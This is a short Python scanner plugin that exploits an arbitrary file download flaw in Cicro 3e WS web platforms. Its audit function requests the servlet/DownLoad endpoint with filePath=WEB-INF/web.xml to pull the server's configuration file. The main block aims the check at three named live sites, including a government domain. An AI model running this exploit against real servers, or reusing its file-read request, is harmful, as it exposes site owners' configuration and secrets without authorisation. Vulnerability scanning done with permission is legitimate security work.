#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:时光动态网站平台(Cicro 3e WS) 任意下载
#Refer:http://wooyun.org/bugs/wooyun-2013-035064


def assign(service,arg):
    if service=="cicro":
        return True,arg 


def  audit(arg):
    url=arg+"servlet/DownLoad?filePath=WEB-INF/web.xml"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and 'servlet-name' in res:
        security_hole(url)
if __name__=="__main__":
    from dummy import *
    audit(assign('cicro','http://wsk.ccsu.cn/')[1])
    audit(assign('cicro','http://www.xianelectric.com.cn/')[1])
    audit(assign('cicro','http://www.shz.gov.cn/')[1])